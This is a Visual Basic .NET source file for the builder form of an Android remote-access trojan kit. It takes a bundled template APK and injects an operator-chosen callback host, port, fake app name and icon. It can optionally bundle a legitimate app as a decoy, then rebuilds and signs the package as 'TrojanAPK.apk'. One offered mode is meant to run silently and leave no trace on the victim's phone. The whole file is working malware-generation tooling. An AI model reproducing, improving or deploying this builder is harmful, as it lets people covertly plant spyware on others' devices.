Imports System.ComponentModel
Imports System.IO
Imports System.Drawing.Imaging
Imports Microsoft.VisualBasic
Imports Microsoft.VisualBasic.CompilerServices
Imports System
Imports System.Collections
Imports System.Diagnostics
Imports System.Drawing
Imports System.Drawing.Drawing2D
Imports System.Runtime.CompilerServices
Imports System.Threading
Imports System.Windows.Forms
'##################################################
'################### CODED  #######################
'##################### BY #########################
'############### Saher Blue Eagle  ################
'###############  XPR OPEN SOURCE  ################
'##################################################
'##################################################
Public Class Build_Apk
    Private boolen_exit As Boolean
    Private cmd_0 As Object
    Public android_host As String = ""
    Private cmd_running_cmd As Boolean
    ' Private components As IContainer
    Private folder_apktool As String
    Private folder_Building As String
    Private Const name_static As String = "app-release"
    Private name_folder_app_resource As String = "App_Resources"
    Private start As DateTime
    Private xx As Boolean
    Private build_apk_temp_path As String
    ' Nested Types
    Public Delegate Sub inv_cmd(ByVal d0 As Object, ByVal b0 As Object)
    Public Delegate Sub prg(ByVal v As Integer)

    Private Sub title(ByVal t As String, ByVal i As String)
        Dim str As String = String.Format(t, i)
        Me.Text = str
    End Sub
    Private Sub File_zip_Decompress(ByVal zipPath As String, ByVal pathfolder As String)
        Try
            If Not Directory.Exists(pathfolder) Then
                Directory.CreateDirectory(pathfolder)
            End If
            '  ExtractZip("C:\PIS\ENUMWINDOWS.zip", "C:\PIS\Test\")
            ExtractZip(zipPath, pathfolder)
        Catch exception1 As Exception
           
        End Try
    End Sub
    Private Sub ExtractZip(zipFile As String, destination As String)
        Dim shell As New Shell32.Shell()
        shell.[NameSpace](destination).CopyHere(shell.[NameSpace](zipFile).Items(), Nothing)
        shell = Nothing

    End Sub




    Public Sub prog(ByVal v As Integer)
        If MyBase.InvokeRequired Then
            Dim method As prg = New prg(AddressOf Me.prog)
            Dim args As Object() = New Object() {v}
            MyBase.Invoke(method, args)
        Else
            Me.ProgressBar1.Value = v
        End If
    End Sub
    Private Sub Image_scaling(ByVal w_00 As Object, ByVal h_00 As Object, ByVal n_00 As Object)
        Try
            If Me.xx Then
                Dim objArray As Object()
                Dim flagArray As Boolean()
                Dim image As New Bitmap(Conversions.ToString(Me.PictureBox1.Tag))
                Dim width As Integer = Conversions.ToInteger(w_00)
                Dim height As Integer = Conversions.ToInteger(h_00)
                Dim bitmap2 As New Bitmap(width, height)
                Dim graphics As Graphics = graphics.FromImage(bitmap2)
                graphics.InterpolationMode = InterpolationMode.Low
                graphics.DrawImage(image, New Rectangle(0, 0, width, height), New Rectangle(0, 0, image.Width, image.Height), GraphicsUnit.Pixel)
                graphics.Dispose()
                Dim objArray1 As Object() = New Object() {n_00, ImageFormat.Png}
                Dim flagArray1 As Boolean() = New Boolean(2 - 1) {}
                flagArray1(0) = True
                objArray = objArray1
                flagArray = flagArray1
                NewLateBinding.LateCall(bitmap2, Nothing, "Save", objArray1, Nothing, Nothing, flagArray1, True)
                ' NewLateBinding.LateCall(bitmap2, Nothing, "Save", objArray, Nothing, Nothing, flagArray, True)
                If flagArray(0) Then
                    n_00 = RuntimeHelpers.GetObjectValue(objArray(0))
                End If
                image.Dispose()
                bitmap2.Dispose()
            End If
        Catch exception1 As Exception

        End Try
    End Sub
    Private Function min() As Boolean
        Dim flag As Boolean

Label_0019:

        Dim str As String = Application.StartupPath & "\apkBuilding_Tools\"
        Me.folder_Building = (str & "Building")
        Me.folder_apktool = (str & "Building\apktool")
        Try

            If Not System.IO.Directory.Exists(Me.folder_Building) Then
                System.IO.Directory.CreateDirectory(Me.folder_Building)
                GoTo Label_0019
            End If
            If Not System.IO.Directory.Exists(Me.folder_apktool) Then
                Me.File_zip_Decompress((Application.StartupPath & "\" & Me.name_folder_app_resource & "\apktool\apktool.zip"), (Me.folder_Building & "\"))
                GoTo Label_0019
            End If
            If Not (System.IO.Directory.Exists(Me.folder_Building) And System.IO.Directory.Exists(Me.folder_apktool)) Then
                GoTo Label_0019
            End If
            If System.IO.Directory.Exists((Me.folder_apktool & "\app-release")) Then
                Directory.Delete((Me.folder_apktool & "\app-release"), True)
                GoTo Label_0019
            End If
            flag = True
        Catch exception1 As Exception

            flag = False

        End Try
        Return flag
    End Function
    Private Sub step0()
        If Me.min Then
            If Not Me.cmd_running_cmd Then
                Me.xx = Me.cmd_running
            End If
            If Me.xx Then
                Me.boolen_exit = True
                Me.Button1.Enabled = False
                Me.step1()
            End If
        End If
    End Sub

    Private Sub step1()
        If Me.xx Then
            Dim arguments As Object() = New Object() {"java -version"}
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", arguments, Nothing, Nothing, Nothing, True)
        End If
    End Sub

    Private Sub step2()
        If Me.xx Then
            Dim arguments As Object() = New Object() {("cd " & Me.folder_apktool)}
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", arguments, Nothing, Nothing, Nothing, True)
            Me.step3()
            Me.prog(10)
        End If
    End Sub

    Private Sub step3()
        If Me.xx Then
            Dim arguments As Object() = New Object() {"apktool d app-release.apk"}
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", arguments, Nothing, Nothing, Nothing, True)
            Me.prog(15)
            Dim c As New Thread(New ThreadStart(AddressOf Me.re_a)) With { _
                .IsBackground = True _
            }
            c.Start()
        End If
    End Sub

    Private Sub step4()
        If Me.xx Then
            Dim arguments As Object() = New Object() {"apktool b -f -r app-release"}
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", arguments, Nothing, Nothing, Nothing, True)
            Me.step5()
            Me.prog(70)
        End If
    End Sub

    Private Sub step5()
        If Me.xx Then
            Dim arguments As Object() = New Object() {"java -jar SignApk.jar certificate.pem key.pk8 app-release\dist\app-release.apk out\TrojanAPK.apk"}
            NewLateBinding.LateCall(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StandardInput", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "WriteLine", arguments, Nothing, Nothing, Nothing, True)
            Me.prog(80)
        End If
    End Sub

    Private Sub step6(ByVal b As Boolean)
        Do While b

            If System.IO.File.Exists((Me.folder_apktool & "\out\TrojanAPK.apk")) Then
                Process.Start((Me.folder_apktool & "\out"))
                Dim span As TimeSpan = DirectCast((DateTime.Now - Me.start), TimeSpan)
                Me.prog(100)
                Me.title("Build Client  -idle time {0}", String.Concat(New String() {Conversions.ToString(span.Minutes), "m", Conversions.ToString(span.Seconds), "s", Conversions.ToString(span.Milliseconds), "ms".ToString}))
                Me.Label4.Visible = True
                Me.Label4.Text = String.Format("idle time {0}", String.Concat(New String() {Conversions.ToString(span.Minutes), "m", Conversions.ToString(span.Seconds), "s", Conversions.ToString(span.Milliseconds), "ms".ToString}))
                Me.boolen_exit = False
                Me.Button1.Enabled = True
                Exit Do
            End If
        Loop
        Form1.Timer2.Start()
    End Sub

    Private Sub re_a()
Label_02FF:
        If Me.xx Then
Label_0006:

            Dim path As String = (Me.folder_apktool & "\app-release\res\values\strings.xml")
            If Not System.IO.File.Exists(path) Then
                GoTo Label_02FF
            End If
            Try
                Dim left As String = Nothing

                left = Conversions.ToString(Operators.AddObject(left, Operators.AddObject(Operators.AddObject(Operators.AddObject(TextBox1.Text.Clone, ","), PortBox.Text.Clone), ",")))

                If left.EndsWith(",") Then
                    left = left.ToString.Remove((left.ToString.Length - 1)).ToString
                End If
                Dim newValue As String = Nothing
                Dim num4 As Integer = (Me.CheckedListBox1.Items.Count - 1)
                Dim i As Integer = 0
                Do While (i <= num4)
                    newValue = (newValue & Conversions.ToString(CInt(Me.CheckedListBox1.GetItemCheckState(i))))
                    i += 1
                Loop
                Dim num As Integer = 0
                If Me.CheckBox1.Checked Then
                    num = 1
                End If


                Dim contents As String = My.Computer.FileSystem.ReadAllText(path).Replace("[0x0x0x0_Host_0x0x0x0]", left).Replace("[0x0x0x0_Client_Name_0x0x0x0]", Me.TextBox2.Text).Replace("[0x0x0x0_App_Name_0x0x0x0]", Me.TextBox3.Text).Replace("[0x0x0x0_Service_Name_0x0x0x0]", Me.TextBox4.Text).Replace("[0x0x0x0_Version_0x0x0x0]", Me.TextBox5.Text).Replace("[0x0x0x0_Group_Properties_0x0x0x0]", newValue).Replace("[0x0x0x0_Merge_file_0x0x0x0]", Conversions.ToString(num)).Replace("[0x0x0x0_Package_file_0x0x0x0]", Me.TextBox7.Text)
                System.IO.File.WriteAllText(path, contents)
                If Not Me.CheckBox1.Checked Then
                    GoTo Label_030E
                End If
            Catch exception1 As Exception

                GoTo Label_0006
            End Try
Label_0258:

            Try
                If ((Me.TextBox6.Text.Length > 0) And (Me.TextBox7.Text.Length > 0)) Then
                    Dim str5 As String = (Me.folder_apktool & "\app-release\res\raw\google.apk")
                    If Not System.IO.File.Exists(str5) Then
                        GoTo Label_0258
                    End If
                    System.IO.File.Delete(str5)
                    Dim text As String = Me.TextBox6.Text
                    If System.IO.File.Exists([text]) Then
                        System.IO.File.Copy([text], str5)
                    End If
                End If
                GoTo Label_030E
            Catch exception9 As Exception

                GoTo Label_0258
            End Try
            GoTo Label_02FF
        End If
Label_030E:
        Me.prog(20)
        Do While Me.xx
Label_031A:

            Dim str7 As String = (Me.folder_apktool & "\app-release\res\mipmap-hdpi-v4\ic_launcher.png")
            If System.IO.File.Exists(str7) Then
                Try
                    System.IO.File.Delete(str7)
                    Me.Image_scaling(&H48, &H48, str7)
                    GoTo Label_03F0
                Catch exception10 As Exception

                    GoTo Label_031A
                End Try
            End If
        Loop
        Me.prog(&H19)
Label_03F0:
        Do While Me.xx
Label_0391:

            Dim str8 As String = (Me.folder_apktool & "\app-release\res\mipmap-mdpi-v4\ic_launcher.png")
            If System.IO.File.Exists(str8) Then
                Try
                    System.IO.File.Delete(str8)
                    Me.Image_scaling(&H30, &H30, str8)
                    GoTo Label_0467
                Catch exception11 As Exception

                    GoTo Label_0391
                End Try
            End If
        Loop
        Me.prog(30)
Label_0467:
        Do While Me.xx
Label_0408:

            Dim str9 As String = (Me.folder_apktool & "\app-release\res\mipmap-xhdpi-v4\ic_launcher.png")
            If System.IO.File.Exists(str9) Then
                Try
                    System.IO.File.Delete(str9)
                    Me.Image_scaling(&H60, &H60, str9)
                    GoTo Label_04DE
                Catch exception12 As Exception

                    GoTo Label_0408
                End Try
            End If
        Loop
        Me.prog(&H23)
Label_04DE:
        Do While Me.xx
Label_047F:

            Dim str10 As String = (Me.folder_apktool & "\app-release\res\mipmap-xhdpi-v4\ic_launcher.png")
            If System.IO.File.Exists(str10) Then
                Try
                    System.IO.File.Delete(str10)
                    Me.Image_scaling(&H60, &H60, str10)
                    GoTo Label_055B
                Catch exception13 As Exception

                    GoTo Label_047F
                End Try
            End If
        Loop
        Me.prog(40)
Label_055B:
        Do While Me.xx
Label_04F6:

            Dim str11 As String = (Me.folder_apktool & "\app-release\res\mipmap-xxhdpi-v4\ic_launcher.png")
            If System.IO.File.Exists(str11) Then
                Try
                    System.IO.File.Delete(str11)
                    Me.Image_scaling(&H90, &H90, str11)
                    GoTo Label_05D8
                Catch exception14 As Exception

                    GoTo Label_04F6
                End Try
            End If
        Loop
        Me.prog(&H2D)
Label_05D8:
        Do While Me.xx
Label_0573:

            Dim str12 As String = (Me.folder_apktool & "\app-release\res\mipmap-xxxhdpi-v4\ic_launcher.png")
            If System.IO.File.Exists(str12) Then
                Try
                    System.IO.File.Delete(str12)
                    Me.Image_scaling(&HC0, &HC0, str12)
                    GoTo Label_05ED
                Catch exception15 As Exception

                    GoTo Label_0573
                End Try
            End If
        Loop
        Me.prog(50)
Label_05ED:
        If Me.xx Then
            Me.step4()
        End If
    End Sub

    Private Sub close_cmd()
        Me.cmd_running_cmd = False
        Me.xx = False
        Try
            Try
                NewLateBinding.LateCall(Me.cmd_0, Nothing, "CancelOutputRead", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            Catch exception1 As Exception
                ProjectData.SetProjectError(exception1)
                Dim exception As Exception = exception1
                ProjectData.ClearProjectError()
            End Try
            Try
                NewLateBinding.LateCall(Me.cmd_0, Nothing, "CancelErrorRead", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            Catch exception6 As Exception
                ProjectData.SetProjectError(exception6)
                Dim exception2 As Exception = exception6
                ProjectData.ClearProjectError()
            End Try
            Try
                NewLateBinding.LateCall(Me.cmd_0, Nothing, "Kill", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            Catch exception7 As Exception
                ProjectData.SetProjectError(exception7)
                Dim exception3 As Exception = exception7
                ProjectData.ClearProjectError()
            End Try
            Try
                NewLateBinding.LateCall(Me.cmd_0, Nothing, "Close", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            Catch exception8 As Exception
                ProjectData.SetProjectError(exception8)
                Dim exception4 As Exception = exception8
                ProjectData.ClearProjectError()
            End Try
        Catch exception9 As Exception
            ProjectData.SetProjectError(exception9)
            Dim exception5 As Exception = exception9
            ProjectData.ClearProjectError()
        End Try
        Me.cmd_0 = Nothing
        Me.boolen_exit = False
        MyBase.Close()
    End Sub
    <CompilerGenerated(), DebuggerHidden()> _
    Private Sub _Lambda__R240(ByVal a0 As Object, ByVal a1 As EventArgs)

    End Sub
    Public Sub Sync_Output(ByVal d01 As Object, ByVal b01 As Object)
        Try
            If MyBase.InvokeRequired Then
                Dim method As inv_cmd = New inv_cmd(AddressOf Me.Sync_Output)
                Dim args As Object() = New Object() {d01, b01}
                MyBase.Invoke(method, args)
            Else
                If NewLateBinding.LateGet(b01, Nothing, "Data", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString.Contains("Java(TM) SE Runtime Environment") Then
                    Me.prog(5)
                    Me.step2()
                ElseIf NewLateBinding.LateGet(b01, Nothing, "data", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString.Contains("java -jar SignApk.jar") Then
                    Me.prog(80)
                    Dim vt As New Thread(New ParameterizedThreadStart(AddressOf Me._Lambda__R244)) With { _
                         .IsBackground = True _
                     }
                    vt.Start(Me.xx)
                ElseIf ((Me.ProgressBar1.Value = 0) AndAlso (NewLateBinding.LateGet(b01, Nothing, "Data", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString.Contains("'java -version' is not") Or NewLateBinding.LateGet(b01, Nothing, "Data", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString.Contains("'java' is not"))) Then
                    Me.boolen_exit = False
                    Me.Button1.Enabled = True
                End If
                Me.RichTextBox1.AppendText((NewLateBinding.LateGet(b01, Nothing, "Data", New Object(0 - 1) {}, Nothing, Nothing, Nothing).ToString & Environment.NewLine))
                Me.RichTextBox1.ScrollToCaret()
            End If
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            ProjectData.ClearProjectError()
        End Try
    End Sub
    <CompilerGenerated(), DebuggerHidden()> _
    Private Sub _Lambda__R244(ByVal a0 As Object)
        Me.step6(Conversions.ToBoolean(a0))
    End Sub
    Public Function cmd_running() As Boolean
        '##################################################
        '################### CODED  #######################
        '##################### BY #########################
        '############### Saher Blue Eagle  ################
        '###############  XPR OPEN SOURCE  ################
        '##################################################
        '##################################################
        Dim flag As Boolean
        Try
            Me.cmd_0 = New Process
            Dim arguments As Object() = New Object() {True}
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "RedirectStandardOutput", arguments, Nothing, Nothing, False, True)
            Dim objArray2 As Object() = New Object() {True}
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "RedirectStandardInput", objArray2, Nothing, Nothing, False, True)
            Dim objArray3 As Object() = New Object() {True}
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "RedirectStandardError", objArray3, Nothing, Nothing, False, True)
            Dim objArray4 As Object() = New Object() {"cmd.exe"}
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "FileName", objArray4, Nothing, Nothing, False, True)
            Dim objArray5 As Object() = New Object() {True}
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "RedirectStandardError", objArray5, Nothing, Nothing, False, True)
            AddHandler DirectCast(Me.cmd_0, Process).OutputDataReceived, New DataReceivedEventHandler(AddressOf Me.Sync_Output)
            AddHandler DirectCast(Me.cmd_0, Process).ErrorDataReceived, New DataReceivedEventHandler(AddressOf Me.Sync_Output)
            AddHandler DirectCast(Me.cmd_0, Process).Exited, New EventHandler(AddressOf Me._Lambda__R240)
            Dim objArray6 As Object() = New Object() {False}
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "UseShellExecute", objArray6, Nothing, Nothing, False, True)
            Dim objArray7 As Object() = New Object() {True}
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "CreateNoWindow", objArray7, Nothing, Nothing, False, True)
            Dim objArray8 As Object() = New Object() {ProcessWindowStyle.Hidden}
            NewLateBinding.LateSetComplex(NewLateBinding.LateGet(Me.cmd_0, Nothing, "StartInfo", New Object(0 - 1) {}, Nothing, Nothing, Nothing), Nothing, "WindowStyle", objArray8, Nothing, Nothing, False, True)
            Dim objArray9 As Object() = New Object() {True}
            NewLateBinding.LateSet(Me.cmd_0, Nothing, "EnableRaisingEvents", objArray9, Nothing, Nothing)
            NewLateBinding.LateCall(Me.cmd_0, Nothing, "Start", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateCall(Me.cmd_0, Nothing, "BeginErrorReadLine", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            NewLateBinding.LateCall(Me.cmd_0, Nothing, "BeginOutputReadLine", New Object(0 - 1) {}, Nothing, Nothing, Nothing, True)
            Me.cmd_running_cmd = True
            flag = True
        Catch exception1 As Exception
            ProjectData.SetProjectError(exception1)
            Dim exception As Exception = exception1
            flag = False
            ProjectData.ClearProjectError()
        End Try
        Return flag
    End Function

    Private Sub Build_Apk_Load(sender As System.Object, e As System.EventArgs) Handles MyBase.Load
        Me.boolen_exit = False
        Me.xx = False
        Me.cmd_running_cmd = False
        build_apk_temp_path = Application.StartupPath & "\" & "apk_tmp.apk"

    End Sub
    Private Sub RELOAD_APK_TEMP(ByVal isstamina As Boolean)
        Try
            Try
                If IO.File.Exists(build_apk_temp_path) Then
                    IO.File.Delete(build_apk_temp_path)
                End If
            Catch ex As Exception

            End Try
          
            If isstamina = False Then
                'IO.File.WriteAllBytes(build_apk_temp_path, My.Resources.Patch_release)

                IO.File.WriteAllBytes(build_apk_temp_path, My.Resources.Patch_release)


            ElseIf isstamina = True Then
                IO.File.WriteAllBytes(build_apk_temp_path, My.Resources.Patch_StaminaMode_release)
            End If

        Catch ex As Exception
            MsgBox("EXXX " & ex.Message)
        End Try
    End Sub
    Private Sub CheckBox1_CheckedChanged(sender As System.Object, e As System.EventArgs) Handles CheckBox1.CheckedChanged
        If CheckBox1.Checked = False Then
            TextBox6.Enabled = False
            TextBox7.Enabled = False
            Button2.Enabled = False
        Else
            TextBox6.Enabled = True
            TextBox7.Enabled = True
            Button2.Enabled = True
        End If
    End Sub

    Private Sub Button2_Click(sender As System.Object, e As System.EventArgs) Handles Button2.Click
        Me.OpenFileDialog1.Filter = "apk Files (*.apk)|*.apk"
        If OpenFileDialog1.ShowDialog = Windows.Forms.DialogResult.OK Then
            If OpenFileDialog1.CheckFileExists Then
                TextBox6.Text = OpenFileDialog1.FileName
            End If
        End If
    End Sub

    Private Sub Button1_Click(sender As System.Object, e As System.EventArgs) Handles Button1.Click
        'final build operation
        Dim Choice_C As String = InputBox("Choose the Trojan APK Mode [Enter Numbers Only] " & vbNewLine & "Hint" & vbNewLine & "1 : Normal APK will run with leaving a part in Notification Area on some android versions" & vbNewLine & "2 : Stamina Mode APK will work silently without leaving anything refers to itself", "Choosing Trojan Mode", "1")
        Dim Choice_I As Integer = -1
        Try
            Choice_I = Integer.Parse(Choice_C)
        Catch ex As Exception

        End Try
        If Choice_I = -1 Then
            MsgBox("Exit Builder RECALL" & vbNewLine & "You are Kidding !!! [RESET Trojan Values]", MsgBoxStyle.Critical)
        ElseIf Choice_I = 1 Then
            MessageBox.Show("If took more time , or an error ," & vbNewLine & "Remove folder : apkBuilding_Tools, Only " & vbNewLine & "If stuck at : copying original files ; do the same and change the program whole directory [example from any drive to desktop] , and restart it ", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information)
            android_host = "androidhost=" & TextBox1.Text & "port=" & PortBox.Text
            RELOAD_APK_TEMP(False)
            B0ToolStripMenuItem_Click()

        ElseIf Choice_I = 2 Then
            MessageBox.Show("If took more time , or an error ," & vbNewLine & "Remove folder : apkBuilding_Tools, Only " & vbNewLine & "If stuck at : copying original files ; do the same and change the program whole directory [example from any drive to desktop] , and restart it ", "Information", MessageBoxButtons.OK, MessageBoxIcon.Information)
            android_host = "androidhost=" & TextBox1.Text & "port=" & PortBox.Text
            RELOAD_APK_TEMP(True)
            B0ToolStripMenuItem_Click()
        Else
            MsgBox("Exit Main RECALL" & vbNewLine & "You are 100% Now Kidding !!! [RESET All Values]", MsgBoxStyle.Critical)
            Application.Exit()
        End If

    End Sub
    Private Sub B0ToolStripMenuItem_Click()
        Try 

            Dim num As Integer = 0
            If (TextBox1.Text.Length = 0) Then
                MsgBox("Enter valid port")

            Else
                If PortBox.Text.Length = 0 Then
                    MsgBox("Enter valid port")
                Else
                    num = 5
                End If
            End If
            
            If Me.CheckBox1.Checked Then
                If (Me.TextBox6.Text.Length = 0) Then
                    MsgBox("Cannot be Empty")
                Else

                    num += 1
                End If
                If (Me.TextBox7.Text.Length = 0) Then
                    MsgBox("Cannot be Empty")
                Else

                    num += 1
                End If
            Else

                num = (num + 2)
            End If

            If (num = 7) Then


                If (IO.File.Exists(build_apk_temp_path)) Then
                    If Operators.ConditionalCompareObjectEqual(Me.PictureBox1.Tag, Nothing, False) Then
                        Me.PictureBox1.Tag = (Application.StartupPath & "\" & Me.name_folder_app_resource & "\icons\icon_diverse\icon_default.png")
                    End If
                    If Me.min Then
                        If File.Exists((Me.folder_apktool & "\app-release.apk")) Then
                            File.Delete((Me.folder_apktool & "\app-release.apk"))
                        End If
                        If File.Exists((Me.folder_apktool & "\out\TrojanAPK.apk")) Then
                            File.Delete((Me.folder_apktool & "\out\TrojanAPK.apk"))
                        End If
                        File.Copy(build_apk_temp_path, (Me.folder_apktool & "\app-release.apk"))
                        Me.Button2.Enabled = False

                        Dim str2 As String = Nothing
                        Dim num2 As Integer = (Me.CheckedListBox1.Items.Count - 1)
                        Dim i As Integer = 0
                        Do While (i <= num2)
                            str2 = (str2 & Conversions.ToString(CInt(Me.CheckedListBox1.GetItemCheckState(i))))
                            i += 1
                        Loop

                        Me.step0()
                    End If
                End If
            End If
        Catch ex As Exception
            MsgBox("Build Error : " & ex.Message)
        End Try
    End Sub

    '##################################################
    '################### CODED  #######################
    '##################### BY #########################
    '############### Saher Blue Eagle  ################
    '###############  XPR OPEN SOURCE  ################
    '##################################################
    '##################################################
End Class